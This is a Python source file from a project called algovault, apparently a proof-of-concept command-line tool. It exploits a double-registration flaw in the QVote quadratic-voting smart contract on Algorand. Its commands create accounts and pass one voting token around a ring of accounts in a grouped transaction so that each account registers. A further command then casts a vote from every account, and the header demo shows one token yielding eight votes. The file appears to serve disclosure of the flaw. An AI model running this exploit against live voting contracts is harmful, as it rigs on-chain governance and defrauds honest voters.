# Copyright 2021 Mackenzie Straight
#
# This file is part of algovault.
#
# algovault is free software: you can redistribute it and/or modify it under the
# terms of the GNU Affero General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option) any
# later version.
#
# algovault is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE.  See the GNU Affero General Public License for more
# details.
#
# You should have received a copy of the GNU Affero General Public License along
# with algovault.  If not, see <https://www.gnu.org/licenses/>.
# QVote contract (as of 2021-12-03) is insecure and allows double registration,
# and therefore double voting.
#
# $ ./algovault.py qvote-counter create-accounts \
#   --sender SMCQDRS5MDSD3DLO6K2IJJU3ZVGN734X2GATUB23BZBQ5M75OBF5GFZGOE \
#   --asset 47862693 \
#   --out_file accounts.json
#
# $ jq . accounts.json
#
# [
#   "HAJLNJYCBH4AGWQFPEOFYODW6WEQNXHOQHLVVZKPBQH5BTDC2MMM5KBAFA",
#   "V3AXYB2WAW7K3KXWLCJ53BAA6QOB7NGSMV23M3FOT3UXIAAG4PILFNAUC4",
#   "6CTDX7LFWLYPQ5HOUB7XX3XYXFD6YOFABWEMAB57GJB4NETO2IZ7OONS4E",
#   "W44BA5SDUAY7G23XBBOJMUQFN2G77LLDWD3SWYAXABYTSQBUBIU7KNNUI4",
#   "H6XG2C6IKBNOF6AYTGKXY2SDKWHRYMQ7HHLRZT2BNYL3DCOACE2TBU6KHY",
#   "YUWPL43QAVSID7CXC3FG4PESZXHXK3EPAWAIAMYHZONZXSNAP76GPAXWT4",
#   "MHTHWC2TZHY2URXBHZ3PTBZ4OVZMX3LLGK2VIIHEV52I764D3LFNSYK7WU",
#   "SH5C4DAUEWLER556PAZ2S5QXCKUU36AY4A74LBURSV3DVP6OP4L6VIRAWI"
# ]
#
# $ goal asset send -a 1 --assetid 47862693 \
#   -f SMCQDRS5MDSD3DLO6K2IJJU3ZVGN734X2GATUB23BZBQ5M75OBF5GFZGOE \
#   -t HAJLNJYCBH4AGWQFPEOFYODW6WEQNXHOQHLVVZKPBQH5BTDC2MMM5KBAFA
#
# ...
#
# $ ./algovault.py qvote-counter create-proposal \
#   --creator SMCQDRS5MDSD3DLO6K2IJJU3ZVGN734X2GATUB23BZBQ5M75OBF5GFZGOE \
#   --name "Will it Blend?" \
#   --option "Yes" \
#   --option "Definitely Yes" \
#   --asset 47862693 \
#
# Proposal ID: 48920164
#
# $ ./algovault.py qvote-counter attack-registration \
#   --address_file accounts.json \
#   --asset 47862693 \
#   --proposal 48920164
#
# Duplicating 1 assets 8 times
#
# ... 5 minutes pass ...
#
# $ ./algovault.py qvote-counter attack-vote \
#   --address_file accounts.json \
#   --proposal 48920164 \
#   --option "Definitely Yes" \
#   --amount 1
#
# $ ./algovault.py qvote-counter status --proposal 48920164
#
# Definitely Yes: 8
# Yes: 0
import base64
import json
import os.path
import sys
import time

from algosdk.future import transaction
import click

from algovault import QVOTE_CONTRACTS_DIR, token
from algovault.client import get_wallet

DEFAULT_TOKEN_ID = 0


def _compile_qvote_contract(acl, name):
    with open(os.path.join(QVOTE_CONTRACTS_DIR, name), "r") as f:
        return base64.b64decode(acl.compile(f.read())["result"])


def _get_asset_balance(info, asset):
    for asset_info in info["assets"]:
        if asset_info["asset-id"] == asset:
            return asset_info["amount"]
    return 0


def _sign_and_send_group(acl, kcl, wallet_handle, pw, group):
    transaction.assign_group_id(group)
    group = [kcl.sign_transaction(wallet_handle, pw, tx) for tx in group]
    group_txid = acl.send_transactions(group)
    transaction.wait_for_confirmation(acl, group_txid)


@click.group("qvote-counter")
def command_group():
    pass


@command_group.command()
@click.option("--creator", required=True)
@click.option("--reserve", required=True)
def create_token(creator, reserve):
    token.create_max_token(creator, "VOTE", "Voting Token", reserve=reserve)


@command_group.command()
@click.option("--creator", required=True)
@click.option("--name", required=True)
@click.option("--option", multiple=True)
@click.option("--asset", type=click.INT, required=True)
@click.option("--coefficient", type=click.INT, default=1)
@click.option("--registration_seconds", type=click.INT, default=300)
@click.option("--voting_seconds", type=click.INT, default=600)
def create_proposal(
    creator, name, option, asset, coefficient, registration_seconds, voting_seconds
):
    kcl, acl, wallet_handle, pw = get_wallet()
    suggested_params = acl.suggested_params()
    approval = _compile_qvote_contract(acl, "quadratic_voting_approval.teal")
    clear_state = _compile_qvote_contract(acl, "quadratic_voting_clear_state.teal")
    local_schema = transaction.StateSchema(num_uints=1, num_byte_slices=1)
    global_schema = transaction.StateSchema(num_uints=61, num_byte_slices=3)
    start_time = round(time.time()) + registration_seconds
    end_time = start_time + voting_seconds
    initial_options = [b"NULL_OPTION"] * 5
    if len(option) > 5:
        click.echo("Only 5 initial options are supported.", err=True)
        sys.exit(1)
    for i, opt in enumerate(option):
        initial_options[i] = opt.encode()
    txn = transaction.ApplicationCreateTxn(
        creator,
        suggested_params,
        transaction.OnComplete.NoOpOC.real,
        approval,
        clear_state,
        global_schema,
        local_schema,
        app_args=[
            name.encode(),
            *initial_options,
            asset.to_bytes(8, "big"),
            coefficient.to_bytes(2, "big"),
            start_time.to_bytes(6, "big"),
            end_time.to_bytes(6, "big"),
        ],
    )
    txn = kcl.sign_transaction(wallet_handle, pw, txn)
    acl.send_transaction(txn)
    transaction_response = transaction.wait_for_confirmation(acl, txn.get_txid())
    app_id = transaction_response["application-index"]
    print("Proposal ID:", app_id)


@command_group.command()
@click.option("--sender", required=True)
@click.option("--num_accounts", type=click.INT, required=True, default=8)
@click.option("--asset", type=click.INT, required=True, default=DEFAULT_TOKEN_ID)
@click.option("--out_file", type=click.Path(), required=True)
def create_accounts(sender, num_accounts, asset, out_file):
    kcl, acl, wallet_handle, pw = get_wallet()
    suggested_params = acl.suggested_params()
    group = []
    addresses = []
    if num_accounts > 8:
        click.echo(
            "Can't create more than 8 accounts at a time because I'm lazy", err=True
        )
        sys.exit(1)
    for _ in range(num_accounts):
        address = kcl.generate_key(wallet_handle, False)
        addresses.append(address)
        print(address)
        group.extend(
            [
                transaction.PaymentTxn(sender, suggested_params, address, 500000),
                transaction.AssetOptInTxn(address, suggested_params, asset),
            ]
        )
    with open(out_file, "w") as f:
        json.dump(addresses, f)
    _sign_and_send_group(acl, kcl, wallet_handle, pw, group)


@command_group.command()
@click.option("--address_file", type=click.Path(), required=True)
@click.option("--asset", type=click.INT, required=True, default=DEFAULT_TOKEN_ID)
@click.option("--proposal", required=True)
def attack_registration(address_file, asset, proposal):
    kcl, acl, wallet_handle, pw = get_wallet()
    suggested_params = acl.suggested_params()
    with open(address_file, "r") as f:
        addresses = json.load(f)
    if len(addresses) > 8:
        click.echo(
            "Can't attack with more than 8 accounts rn because I'm lazy", err=True
        )
        sys.exit(1)
    if len(addresses) == 0:
        click.echo("Need at least 1 address to vote with.", err=True)
        sys.exit(1)
    group = []
    first_account_info = acl.account_info(addresses[0])
    asset_balance = _get_asset_balance(first_account_info, asset)
    print(f"Duplicating {asset_balance} assets {len(addresses)} times")
    # Asset is assumed to be in the first account in the list. It will be passed
    # around in a ring, ending back in the same account.
    for i, address in enumerate(addresses):
        group.extend(
            [
                transaction.ApplicationOptInTxn(address, suggested_params, proposal),
                transaction.AssetTransferTxn(
                    address,
                    suggested_params,
                    addresses[(i + 1) % len(addresses)],
                    asset_balance,
                    asset,
                ),
            ]
        )
    _sign_and_send_group(acl, kcl, wallet_handle, pw, group)


@command_group.command()
@click.option("--address_file", type=click.Path(), required=True)
@click.option("--proposal", required=True)
@click.option("--option", required=True)
@click.option("--amount", type=click.INT, required=True)
def attack_vote(address_file, proposal, option, amount):
    kcl, acl, wallet_handle, pw = get_wallet()
    suggested_params = acl.suggested_params()
    with open(address_file, "r") as f:
        addresses = json.load(f)
    group = [
        transaction.ApplicationCallTxn(
            address,
            suggested_params,
            proposal,
            transaction.OnComplete.NoOpOC.real,
            app_args=[b"vote", option.encode(), amount.to_bytes(2, "big"), b"+"],
        )
        for address in addresses
    ]
    _sign_and_send_group(acl, kcl, wallet_handle, pw, group)


@command_group.command()
@click.option("--proposal", required=True)
def status(proposal):
    _, acl, _, _ = get_wallet()
    info = acl.application_info(proposal)
    for state in info["params"]["global-state"]:
        decoded_key = base64.b64decode(state["key"]).decode()
        if decoded_key.startswith("option_"):
            votes = state["value"]["uint"] - 2 ** 32
            print(f"{decoded_key[7:]}: {votes}")
